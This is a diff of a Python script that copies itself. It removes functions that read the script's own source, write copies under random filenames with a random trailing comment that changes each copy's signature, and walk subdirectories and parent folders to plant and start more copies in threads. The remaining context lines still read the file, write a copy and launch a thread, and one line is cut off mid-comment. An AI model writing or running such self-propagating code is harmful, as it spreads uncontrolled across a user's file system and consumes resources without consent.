@@ -17,16 +17,6 @@ import random
 import string
 
 
-def writeIntoFile(file, lines):
-    count = len(lines)
-    start = 0
-    for line in lines:
-        start = start + 1
-        # we dont want to copy the random string added to the end
-        if start == (count - 1):
-            break
-        file.write(line)
-
 directory = os.getcwd()
 thisfile = os.path.basename(__file__)
 
@@ -35,29 +25,6 @@ def runFuncv():
 
 
 # get the current file
-
-def create_file(dir):
-    abspath = os.path.abspath(__file__)
-    thisfile = os.path.basename(__file__)
-    directory = os.getcwd()
-
-    f = open(thisfile, "r")
-    lines = f.readlines()
-    f.close()
-
-    filename = "{randomness}.py".format(
-        randomness="".join(random.choices(string.ascii_lowercase + string.digits, k=5)))
-
-    i = open(dir + "\\" + filename, "w")
-    writeIntoFile(i, lines)
-    i.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
-    i.close()
-    return filename
-
-
-
-
-
 
 
 f = open(thisfile, "r")
@@ -76,44 +43,6 @@ i.close()
 thread = Thread(target=runFuncv)
 thread.start()
 
-# walk to subdirs
-#for x in os.walk(directory):
-#    if x[0] == os.getcwd():
-#        continue
-    # Create the new file and include a different name
-#    filename = create_file(x[0])
-
-#    thread = Thread(target=runFuncv, args=[x[0] + "\\" + filename])
-#    thread.start()
-
-
-# Working: Write to parent folders
-# start copying the contents of the files to the new one
-# try:
-#    h = open("..\\" + filename, "w")
-#    previousFolder(h, lines)
-#    h.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
-#    h.close()
-#    if os.path.isfile("..\\" + filename):
-#        thread = Thread(target=runFunc("..\\" + filename))
-#        thread.start()
-
-# except:
-#    pass
-def previousFolder(file, lines):
-    count = len(lines)
-    start = 0
-    for line in lines:
-        start = start + 1
-        # we dont want to copy the random string added to the end
-        if start == (count - 1):
-            break
-        file.write(line)
-        if start == 14:
-            if not ("os.chdir('../')" in lines):
-                print("this is where it is")
-                file.write("\nos.chdir('../')\n")
-
-
+# walk to s
 # Ensure this thread gets closed
 sys.exit()
